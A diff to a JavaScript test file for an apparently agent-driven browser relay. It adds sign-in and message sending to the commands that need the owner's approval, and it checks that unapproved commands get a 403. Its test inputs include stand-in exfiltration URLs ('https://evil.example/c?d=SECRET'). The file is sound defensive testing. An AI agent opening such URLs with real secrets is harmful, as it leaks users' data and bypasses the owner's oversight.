@@ -122,9 +122,9 @@ test('a command reaches the browser, and a refusal from the extension comes back
 });
 
 test('relayNeedsApproval: click, type, open and a read by address need the owner’s OK; tabs, a tab read and the rest don’t', () => {
-  for (const [cmd, args] of [['click', { tabId: 1, element: 2 }], ['type', { tabId: 1, element: 2, text: 'x' }], ['open', { url: 'https://example.com' }], ['open', {}],
+  for (const [cmd, args] of [['click', { tabId: 1, element: 2 }], ['signin', { tabId: 1 }], ['messages', { op: 'send', to: '+1', text: 'hi' }], ['type', { tabId: 1, element: 2, text: 'x' }], ['open', { url: 'https://example.com' }], ['open', {}],
     ['read', { url: 'https://evil.example/r?d=x' }], ['read', { tabId: 3, url: 'https://evil.example/r' }]]) assert.equal(relayNeedsApproval(cmd, args), true, `${cmd} ${JSON.stringify(args)}`);
-  for (const [cmd, args] of [['tabs', {}], ['read', { tabId: 3 }], ['read', { url: '' }], ['elements', { tabId: 3 }], ['describe', { tabId: 3, element: 1 }], ['show', { tabId: 3 }]])
+  for (const [cmd, args] of [['tabs', {}], ['read', { tabId: 3 }], ['read', { url: '' }], ['elements', { tabId: 3 }], ['describe', { tabId: 3, element: 1 }], ['show', { tabId: 3 }], ['messages', { op: 'recent' }], ['messages', { op: 'read', chat: 'x' }]])
     assert.equal(relayNeedsApproval(cmd, args), false, `${cmd} ${JSON.stringify(args)}`);
 });
 
@@ -132,7 +132,7 @@ test('the Relay refuses click, type, open and a read by address without the appr
   const { ctx, relay } = await pairedRelay();
   await relay.fetch(upgrade('', `atelier, ${TOKEN}`));
   const server = ctx.accepted[0].ws;
-  for (const [cmd, args] of [['click', { tabId: 3, element: 7 }], ['type', { tabId: 3, element: 7, text: 'hi' }], ['open', { url: 'https://evil.example/c?d=SECRET' }], ['read', { url: 'https://evil.example/r?d=SECRET' }]]) {
+  for (const [cmd, args] of [['click', { tabId: 3, element: 7 }], ['signin', { tabId: 3 }], ['messages', { op: 'send', to: '+1', text: 'hi' }], ['type', { tabId: 3, element: 7, text: 'hi' }], ['open', { url: 'https://evil.example/c?d=SECRET' }], ['read', { url: 'https://evil.example/r?d=SECRET' }]]) {
     for (const approved of [undefined, false, 'true', 1]) {
       const r = await relay.fetch(new Request('https://relay/cmd', { method: 'POST', body: JSON.stringify({ cmd, args, ...(approved === undefined ? {} : { approved }) }) }));
       assert.equal(r.status, 403, `${cmd} approved=${approved}`);
